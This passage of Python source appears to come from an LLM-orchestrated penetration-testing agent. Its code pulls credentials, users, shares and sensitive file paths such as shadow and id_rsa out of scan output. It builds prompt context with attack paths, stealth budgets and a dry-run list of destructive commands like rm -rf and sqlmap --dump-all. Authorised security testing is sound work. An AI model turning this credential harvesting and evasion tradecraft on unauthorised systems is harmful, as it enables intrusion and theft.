            # CVEs
            cves = agent._extract_cves(stdout)
            combined["cves"] = _merge_string_lists(combined["cves"], cves)

            # Web paths
            paths = agent._extract_web_paths(stdout)
            combined["web_paths"].extend(p for p in paths if p not in combined["web_paths"])
            combined["paths"].extend(p for p in paths if p not in combined["paths"])

            # Credentials
            creds = agent._extract_credentials(stdout)
            combined["credentials"].extend(creds)

            # PrivEsc specific
            if instr.tool.lower() == "sudo" or "-l" in instr.args:
                combined["sudo_rights"] = stdout[:1000]
            if instr.tool == "find" and "perm" in instr.args:
                combined["suid_files"] = [l.strip() for l in stdout.splitlines() if l.strip()]
            if instr.tool == "uname":
                combined["kernel"] = stdout.strip()
            if "linpeas" in instr.tool.lower():
                combined["linpeas_summary"] = stdout[:3000]
            if result.get("exit_code", 1) == 0:
                combined["exit_code"] = 0

            # ── Extended extraction ──────────────────────────
            # Store raw output per tool for LLM context
            combined.setdefault("raw_outputs", {})[instr.tool] = stdout[-2000:]

            # Extract service version strings from nmap -sV output
            for m in re.finditer(
                r'(\d+)/(?:tcp|udp)\s+open\s+\S+\s+(.{5,80})', stdout
            ):
                port_num = int(m.group(1))
                version  = m.group(2).strip()
                combined.setdefault("service_versions", {})[port_num] = version
                # Also build human-readable service description
                desc = f"{port_num}: {version}"
                if desc not in combined.setdefault("open_services_detail", []):
                    combined["open_services_detail"].append(desc)

            # Extract usernames from various tools
            for m in re.finditer(
                r'(?:user(?:name)?[:\s]+|account[:\s]+|login[:\s]+)([a-zA-Z0-9_\-\.]{2,32})',
                stdout, re.IGNORECASE
            ):
                u = m.group(1).strip()
                if u.lower() not in ('anonymous', 'none', 'null', 'root', 'admin') and                    u not in combined.setdefault("users", []):
                    combined["users"].append(u)

            # Extract SMB/NFS shares
            for m in re.finditer(
                r'(?:Disk|IPC|SYSVOL|NETLOGON|[A-Za-z$][A-Za-z0-9_$\-]{0,30})\s+(?:READ|WRITE|OK|NO ACCESS)',
                stdout, re.IGNORECASE
            ):
                share = m.group(0).split()[0]
                if share not in combined.setdefault("shares", []):
                    combined["shares"].append(share)

            # Extract HTTP login pages
            if instr.tool in ("gobuster", "ffuf", "dirb", "dirsearch", "feroxbuster"):
                for m in re.finditer(
                    r'(/[^\s]*(?:login|signin|auth|admin|wp-login|console|dashboard)[^\s]*)',
                    stdout, re.IGNORECASE
                ):
                    path = m.group(1).strip()
                    if path not in combined.setdefault("login_pages", []):
                        combined["login_pages"].append(path)

            # Extract interesting files
            for m in re.finditer(
                r'(/[^\s]*(?:config|passwd|shadow|\.env|backup|\.bak|\.zip|\.tar|id_rsa|\.xml|\.conf)[^\s]*)',
                stdout, re.IGNORECASE
            ):
                f_path = m.group(1).strip()
                if f_path not in combined.setdefault("interesting_files", []):
                    combined["interesting_files"].append(f_path)

            # Extract service banners (first 200 chars of banner-like lines)
            if instr.tool in ("nmap", "netcat", "nc", "curl"):
                for m in re.finditer(
                    r'(?:Server:|X-Powered-By:|Banner:|Version:)\s*(.{5,100})',
                    stdout, re.IGNORECASE
                ):
                    banner = m.group(1).strip()
                    combined.setdefault("banners", {})[instr.tool] = banner

        except Exception as _merge_err:
            # Never let a single bad result kill the whole phase
            import logging
            logging.getLogger('master_agent').warning("_merge_result error for %s: %s", instr.tool, _merge_err)

    # ─── Phase helpers ────────────────────────────────────────

    async def _advance_phase(self, phase: AttackPhase):
        self.phase = phase
        await db.update_session_phase(self._session_id, phase)
        await self._emit("phase_change", {
            "phase":   str(phase),
            "message": f"→ {str(phase).upper().replace('_',' ')}",
            "ts":      datetime.utcnow().isoformat()
        })
        try:
            slog = get_scan_logger(self._session_id)
            if slog:
                slog.log_phase(str(phase), "start")
        except Exception:
            pass

    async def _wait_for_confirmation(self, phase: str, timeout: int = 3600) -> bool:
        evt = asyncio.Event()
        self._confirm_events[f"confirm_{phase}"] = evt
        try:
            await asyncio.wait_for(evt.wait(), timeout=timeout)
            return True
        except asyncio.TimeoutError:
            return False

    async def _apply_pending_guidance(self):
        """
        Check if user has injected guidance and apply it before the next tool runs.
        Non-blocking — returns immediately if nothing queued.
        Handles: skip_phase, force_tool, note (context injection into next LLM call).

        Design note: state mutations (phases_to_run, forced_instructions, intel) happen
        IMMEDIATELY and synchronously. The emit_reasoning / DB-write calls are fired as
        background tasks so they never block guidance processing.
        """
        try:
            guidance = self._guidance_queue.get_nowait()
        except asyncio.QueueEmpty:
            return

        directive  = guidance.get("directive", "")
        skip_phase = guidance.get("skip_phase", "")
        force_tool = guidance.get("force_tool", "")
        force_args = guidance.get("force_args", "")
        note       = guidance.get("note", "")

        # Fire WS notification immediately (fast — no DB write)
        await self._emit("guidance_applied", {
            "directive": directive,
            "message":   f"Guidance applied: {note or directive or force_tool or skip_phase}"
        })

        # Emit reasoning as a fire-and-forget task so a slow DB write
        # never blocks the guidance state changes below
        asyncio.create_task(self.emit_reasoning(
            step       = "user_guidance_applied",
            reasoning  = f"User guidance received: {note or directive or 'no message'}",
            decision   = (
                f"Skipping phase: {skip_phase}" if skip_phase else
                f"Forcing tool: {force_tool} {force_args}" if force_tool else
                f"Context note injected: {note}"
            ),
            next_action= force_tool or ("Continue — note will inform next LLM call" if note else "Continue"),
            data       = guidance
        ))

        # 1. Skip an entire phase
        if skip_phase:
            self._phases_to_run = [p for p in self._phases_to_run if p != skip_phase]
            await self.emit_reasoning(
                step       = "phase_skip_applied",
                reasoning  = f"User requested skipping phase: {skip_phase}",
                decision   = f"Removed {skip_phase} from remaining phases",
                next_action= "Proceed to next phase",
                data       = {"skipped": skip_phase, "remaining": self._phases_to_run}
            )

        # 2. Force-run a specific tool immediately
        if force_tool:
            # Store in pending forced instructions — picked up by _dispatch_and_collect
            if not hasattr(self, "_forced_instructions"):
                self._forced_instructions = []
            self._forced_instructions.append({
                "tool": force_tool,
                "args": force_args or self._intel.get("target", ""),
                "reasoning": f"User-forced: {note or 'Manual guidance from operator'}"
            })
            await self.emit_reasoning(
                step       = "force_tool_queued",
                reasoning  = f"Operator forced tool execution: {force_tool}",
                decision   = f"Will run: {force_tool} {force_args}",
                next_action= f"Execute {force_tool} before next planned step",
                data       = {"tool": force_tool, "args": force_args}
            )

        # 3. Note — injected into _intel so next LLM call sees it
        if note:
            # ── Question intent detection ──────────────────────────────────
            # If the note looks like a question, route it through QuestionEngine
            # for immediate 3-layer extraction against current intel.
            _qe = getattr(self, "_question_engine", None)
            if _qe is None and _REASONING_AVAILABLE:
                # QuestionEngine may live on ReasoningLoop — try to get it
                _rl = getattr(self, "_reasoning_loop_instance", None)
                if _rl is not None:
                    _qe = getattr(_rl, "_question_engine", None)

            if _qe is not None and _qe.is_question(note):
                asyncio.create_task(self._answer_question_from_guidance(note, _qe))
            else:
                existing = self._intel.get("operator_notes", [])
                existing.append({"note": note, "ts": datetime.utcnow().isoformat()})
                self._intel["operator_notes"] = existing[-5:]  # keep last 5

        # 4. DNS entry — hostname→IP mapping for better web testing
        dns_host = guidance.get("dns_host", "")
        dns_ip   = guidance.get("dns_ip", "")
        if dns_host and dns_ip:
            dns_map = self._intel.get("dns_overrides", {})
            dns_map[dns_host] = dns_ip
            self._intel["dns_overrides"] = dns_map
            # Fire-and-forget — DB write must not block the guidance state change
            asyncio.create_task(self.emit_reasoning(
                step       = "dns_override_applied",
                reasoning  = f"Operator added DNS mapping: {dns_host} → {dns_ip}",
                decision   = "Stored in intel — subagents will use this hostname in tool args",
                next_action= "Inject hostname into next web/recon tool calls",
                data       = {"dns_host": dns_host, "dns_ip": dns_ip}
            ))

    async def _answer_question_from_guidance(self, question: str, qe) -> None:
        """
        Fire-and-forget coroutine: run the 3-layer QuestionEngine pipeline
        for a question detected in the operator guidance text.
        Emits a question_answered finding visible in FindingsBoard.
        """
        try:
            await self.emit_reasoning(
                step       = "question_from_guidance",
                reasoning  = f"Operator question detected: {question}",
                decision   = "Running 3-layer extraction against current intel",
                next_action= "Emit answer as finding",
                data       = {"question": question},
            )
            q_obj = await qe.answer_single(question, self._intel, "")
            if q_obj.state.value == "answered":
                await self.emit_reasoning(
                    step       = "question_answered",
                    reasoning  = f"Answer found: {q_obj.answer}",
                    decision   = f"Layer {q_obj.layer_used} ({q_obj.layer_used})",
                    next_action= "Displayed as finding in FindingsBoard",
                    data       = {"answer": q_obj.answer, "layer": q_obj.layer_used},
                )
            else:
                await self.emit_reasoning(
                    step       = "question_unanswerable",
                    reasoning  = f"Could not answer: {question}",
                    decision   = "All 3 layers exhausted",
                    next_action= "Continue scan — more data may answer later",
                    data       = {"question": question},
                )
        except Exception as e:
            pass  # never crash guidance processing

    def inject_guidance(self, guidance: Dict):
        """
        Called from agent_server when user sends guidance via WS or API.
        guidance = {
          "directive": "skip|force_tool|add_note|change_focus",
          "skip_phase": "vuln_id",         # optional — skip entire phase
          "force_tool": "nikto",           # optional — add this tool next
          "force_args": "-h http://...",   # optional — args for forced tool
          "note": "Free text note for master to consider",
          "target_override": "192.168.1.5" # optional — change target
        }
        """
        self._guidance_queue.put_nowait(guidance)

    def confirm_action(self, phase: str):
        evt = self._confirm_events.get(f"confirm_{phase}")
        if evt:
            evt.set()

    def extend_phase(self, phase: str):
        """
        Called by agent_server when operator clicks 'Extend' in the time-extension dialog.
        Sets the extend event for the given phase so _phase_web_testing() (or any other
        timed phase) can resume.  Also works as the confirmation gate for confirm_web.
        """
        key = f"extend_{phase}"
        if key not in self._extend_events:
            self._extend_events[key] = asyncio.Event()
        self._extend_events[key].set()

    def stop_all_agents(self):
        for agent in [self._recon_agent, self._vuln_agent, self._web_agent,
                      self._osint_agent, self._exploit_agent, self._privesc_agent,
                      self._shell_agent, self._payload_agent]:
            if agent:
                agent.request_stop()
        self.request_stop()

    async def get_status(self) -> Dict:
        return {
            "master_status": str(self.status),
            "current_phase": str(self.phase),
            "llm_available": self._llm_available,
            "intel":         self._intel
        }

    def _intel_summary(self) -> str:
        """
        Returns a compact, human-readable summary of everything discovered so far.
        Injected into every LLM planning call so the model reasons with full context
        instead of only the data passed to each individual method.
        """
        i = self._intel
        lines: List[str] = []

        # ── Engagement context (objective + ReAct memory + pinned insights) ───
        # This is the architectural core: every LLM prompt sees the
        # north-star objective, the last 8 actions+observations, the
        # pinned high-value insights, the failed-action list and the
        # tools currently in circuit-break.  Without this block the
        # planner re-derives context from scratch each phase, which is
        # how the 1h35m amnesia ("no CVEs enumerated yet") happens.
        ctx = getattr(self, "_context", None)
        if ctx is not None:
            try:
                ctx_block = ctx.render_for_prompt()
                if ctx_block:
                    lines.append(ctx_block.rstrip())
            except Exception as _ec_err:
                import logging as _ll
                _ll.getLogger(__name__).debug(
                    "[engagement_context] render failed: %s", _ec_err
                )

        lines.append("=== CURRENT PENTEST INTELLIGENCE ===")

        # Improvement #16 — scope-guard block at the very top so any
        # planner that uses the intel summary as its system context
        # gets the same hard scope rules as direct think() callers.
        guard_text = getattr(self, "_scope_guard", "") or ""
        if guard_text:
            lines.append(guard_text.rstrip())

        # Improvement #18 — live goal-progress timeline (right after scope
        # guard so phase planners see "what we have left to win" up front).
        gtl = getattr(self, "goal_timeline", None)
        if gtl is not None and gtl.goals:
            try:
                from agents.reasoning.goal_timeline import render_timeline_for_prompt
                block = render_timeline_for_prompt(gtl)
                if block:
                    lines.append(block)
            except Exception:
                pass

        # Improvement #13 — dry-run mode banner so the LLM knows
        # destructive actions will be gated for operator preview.
        if getattr(self, "dry_run_mode", False):
            lines.append(
                "=== DRY-RUN MODE: ON === Destructive ops (rm -rf, DROP TABLE, "
                "msf exploit modules, sqlmap --dump-all, hydra, responder) are "
                "previewed for operator review before execution.  Prefer "
                "non-destructive enumeration first."
            )

        # Improvement #11 — noise budget banner (rendered up front so the LLM
        # respects the stealth constraint before picking tools below).
        nb = getattr(self, "noise_budget", None)
        if nb is not None:
            try:
                block = nb.render_for_prompt()
                if block:
                    lines.append(block)
            except Exception:
                pass

        # Improvement #17 — last reasoning chain (so the next planner can
        # self-reference the prior decision pathway).  Walks the most
        # recent validate or finding step back to its root.
        trace = getattr(self, "reasoning_trace", None)
        if trace is not None and len(trace) > 0:
            try:
                from agents.reasoning.reasoning_trace import render_chain_for_prompt
                # Prefer the most recent finding's chain; fall back to
                # the most recent validate step; else the most recent step.
                recent = trace.recent(40)
                anchor = next((s for s in reversed(recent) if s.kind == "finding"), None) \
                       or next((s for s in reversed(recent) if s.kind == "validate"), None) \
                       or (recent[-1] if recent else None)
                chain = trace.chain_for(anchor.step_id) if anchor else []
                block = render_chain_for_prompt(chain)
                if block:
                    lines.append(block)
            except Exception:
                pass

        # Improvement #15 — last self-critique verdict (so the next phase
        # planner sees what was just blocked / held and why).
        crit = i.get("last_self_critique")
        if isinstance(crit, dict) and crit.get("recommendation"):
            try:
                from agents.reasoning.self_critique import render_critique_for_prompt
                block = render_critique_for_prompt(crit)
                if block:
                    lines.append(block)
            except Exception:
                pass

        # Improvement #12 — defensive posture (rendered alongside the noise
        # budget so the LLM picks tradecraft AND volume to suit defenders).
        dp = i.get("defensive_posture")
        if isinstance(dp, dict) and (dp.get("products") or {}):
            try:
                from agents.reasoning.defensive_posture import (
                    DefensivePosture, render_posture_for_prompt,
                )
                rebuilt = DefensivePosture(
                    products            = dict(dp.get("products") or {}),
                    evidence            = list(dp.get("evidence") or []),
                    weight              = int(dp.get("weight") or 0),
                    iteration           = int(dp.get("iteration") or 0),
                    stealth_recommended = bool(dp.get("stealth_recommended")),
                    summary             = str(dp.get("summary") or ""),
                )
                block = render_posture_for_prompt(rebuilt)
                if block:
                    lines.append(block)
            except Exception:
                pass

        # Improvement #10 — Neo4j-inferred attack paths (rendered FIRST so the
        # LLM sees the concrete end-to-end route before priors / chains).
        inferred = i.get("inferred_paths") or []
        if inferred:
            try:
                from agents.reasoning.path_inference import render_paths_for_prompt
                block = render_paths_for_prompt(inferred)
                if block:
                    lines.append(block)
            except Exception:
                pass

        # Improvement #9 — procedural technique chains (rendered before recalls
        # so the LLM sees the structured procedure first).
        chain_attachments = i.get("technique_chains") or []
        if chain_attachments:
            try:
                from agents.reasoning.technique_chains import (
                    TechniqueChain, TechniqueStep, render_chains_for_prompt,
                )
                chain_objs: list = []
                for att in chain_attachments:
                    if not isinstance(att, dict):
                        continue
                    raw = att.get("chain") or {}
                    if not isinstance(raw, dict):
                        continue
                    try:
                        steps = [TechniqueStep(**s) for s in raw.get("steps", [])
                                 if isinstance(s, dict)]
                        chain_objs.append(TechniqueChain(
                            chain_id    = raw.get("chain_id", ""),
                            name        = raw.get("name", ""),
                            description = raw.get("description", ""),
                            phase       = raw.get("phase", ""),
                            applies_when= raw.get("applies_when") or {},
                            steps       = steps,
                            mitre       = list(raw.get("mitre") or []),
                            source      = raw.get("source", "builtin"),
                            confidence  = float(raw.get("confidence", 0.85)),
                        ))
                    except Exception:
                        continue
                block = render_chains_for_prompt(chain_objs)
                if block:
                    lines.append(block)
            except Exception:
                pass

        # Improvement #8 — episodic memory recalls (rendered before scan profile
        # so the LLM sees prior lessons before current bias).
        recalls = i.get("episodic_recalls") or []
        if recalls:
            try:
                from agents.reasoning.episodic_memory import render_recall_block
                block = render_recall_block(recalls)
                if block:
                    lines.append(block)
            except Exception:
                pass

        # Improvement #7 — hypothesis-conditioned scan profile (rendered FIRST
        # so phase planners see the bias before the raw intel dump).
        sp = i.get("scan_profile")
        if isinstance(sp, dict) and any(sp.get(k) for k in (
            "priority_ports", "priority_services", "priority_cves",
            "priority_paths", "priority_hosts",
        )):
            lines.append("--- Scan profile (hypothesis-conditioned) ---")
            if sp.get("top_statement"):
                lines.append(f"  Top hypothesis : {str(sp['top_statement'])[:160]}")
            if sp.get("priority_services"):
                lines.append(f"  Priority svcs  : {', '.join(sp['priority_services'][:8])}")
            if sp.get("priority_ports"):
                lines.append(f"  Priority ports : {', '.join(str(p) for p in sp['priority_ports'][:12])}")
            if sp.get("priority_cves"):
                _pc = [(c.get('cve') or str(c)) if isinstance(c, dict) else str(c)
                       for c in sp['priority_cves'][:8]]
                lines.append(f"  Priority CVEs  : {', '.join(s for s in _pc if s)}")
            if sp.get("priority_paths"):
                lines.append(f"  Priority paths : {', '.join(sp['priority_paths'][:8])}")
            if sp.get("priority_hosts"):
                lines.append(f"  Priority hosts : {', '.join(sp['priority_hosts'][:6])}")
            lines.append(
                "  → Bias scans toward these targets; defer catch-all defaults."
            )
            lines.append("---")

        lines.append(f"Target      : {i.get('target','?')} ({i.get('target_type','unknown')})")
        lines.append(f"OS          : {i.get('os_guess','unknown')}")

        ports = i.get('open_ports', [])
        if ports:
            lines.append(f"Open ports  : {', '.join(str(p) for p in sorted(ports)[:20])}")

        svcs = i.get('services', {})
        if svcs:
            svc_strs = [_fmt_svc(v) for v in list(svcs.values())[:8]]
            lines.append(f"Services    : {' | '.join(svc_strs)}")

        techs = i.get('technologies', [])
        if techs:
            lines.append(f"Technologies: {_safe_join(techs[:8])}")

        cves = i.get('cves', []) or []
        if cves:
            # intel['cves'] may hold plain CVE-ID strings OR dicts
            # ({'cve','severity',...} from cve_lookup) — coerce to IDs so the
            # join never hits "expected str instance, dict found" (the recurring
            # report-gen crash).
            cve_strs = [(c.get('cve') or str(c)) if isinstance(c, dict) else str(c)
                        for c in cves[:10]]
            lines.append(f"CVEs found  : {', '.join(s for s in cve_strs if s)}")

        vulns = i.get('vulnerabilities', [])
        if vulns:
            v_strs = [str(v.get('title', v)) if isinstance(v, dict) else str(v) for v in vulns[:5]]
            lines.append(f"Vulns found : {' | '.join(v_strs)}")

        web_vulns = i.get('web_vulns', [])
        if web_vulns:
            wv_strs = [str(v.get('type','?') + ':' + v.get('url','')) if isinstance(v,dict) else str(v)
                       for v in web_vulns[:5]]
            lines.append(f"Web vulns   : {' | '.join(wv_strs)}")

        web_paths = i.get('web_paths', [])
        if web_paths:
            lines.append(f"Web paths   : {', '.join(web_paths[:10])}")

        mods = i.get('exploit_modules', [])
        if mods:
            m_strs = [str(m.get('module', m)) if isinstance(m, dict) else str(m) for m in mods[:5]]
            lines.append(f"Exploit mods: {' | '.join(m_strs)}")

        creds = i.get('credentials', [])
        if creds:
            c_strs = [f"{c.get('username','?')}:{c.get('password','?')}" if isinstance(c,dict) else str(c)
                      for c in creds[:3]]
            lines.append(f"Credentials : {' | '.join(c_strs)}")

        if i.get('shell_access'):
            lines.append(f"Shell access: YES — user: {i.get('current_user','unknown')}")

        attack_path = i.get('attack_path', [])
        if attack_path:
            lines.append("Attack path :")
            for step in attack_path[-5:]:  # last 5 steps
                phase  = step.get('phase', '?')
                result = step.get('result', '')[:120]
                lines.append(f"  [{phase}] {result}")

        # Service version details (nmap -sV output)
        svc_versions = i.get("service_versions", {})
        if svc_versions:
            lines.append("Service versions:")
            for port, ver in list(svc_versions.items())[:10]:
                lines.append(f"  port {port}: {ver}")

        # Login pages found
        login_pages = i.get("login_pages", [])
        if login_pages:
            lines.append(f"Login pages  : {', '.join(login_pages[:8])}")

        # Interesting files
        ifiles = i.get("interesting_files", [])
        if ifiles:
            lines.append(f"Interesting  : {', '.join(ifiles[:8])}")

        # Users discovered
        users = i.get("users", [])
        if users:
            lines.append(f"Users found  : {', '.join(users[:10])}")

        # SMB/NFS shares
        shares = i.get("shares", [])
        if shares:
            lines.append(f"Shares found : {', '.join(shares[:8])}")

        # Default creds tried
        creds_tried = i.get("default_creds_tried", [])
        if creds_tried:
            lines.append("Creds tried  :")
            for c in creds_tried[-5:]:
                lines.append(f"  {c.get('service','?')} {c.get('user','?')}:{c.get('pass','?')} → {c.get('result','?')}")

        # Banners
        banners = i.get("banners", {})
        if banners:
            for tool, banner in banners.items():
                # banner may be a dict (structured) not a str — coerce so the
                # slice never raises KeyError(slice(None,100,None)) and aborts
                # the whole report.
                lines.append(f"Banner ({tool}): {str(banner)[:100]}")

        # Enumeration findings (structured)
        enum_findings = i.get("enum_findings", [])
        if enum_findings:
            lines.append("Enum findings:")
            for ef in enum_findings[:8]:
                lines.append(f"  • {ef}")

        # Attack surface assessment
        if i.get("attack_surface_notes"):
            lines.append(f"Attack surface: {i['attack_surface_notes'][:200]}")

        # Raw tool outputs (last 500 chars per tool, most recent 3 tools)
        raw = i.get("raw_outputs", {})
        if raw:
            lines.append("Recent tool output snippets:")
            for tool, output in list(raw.items())[-3:]:
                snippet = output[-500:].replace("\n", " ").strip()
                if snippet:
                    lines.append(f"  [{tool}]: {snippet[:200]}")

        notes = i.get("operator_notes", [])
        if notes:
            lines.append("Operator notes (FOLLOW THESE — high priority):")
            for n in notes:
                lines.append(f"  → {n.get('note','')}")

        lines.append("=== END INTELLIGENCE ===")
        return "\n".join(lines)
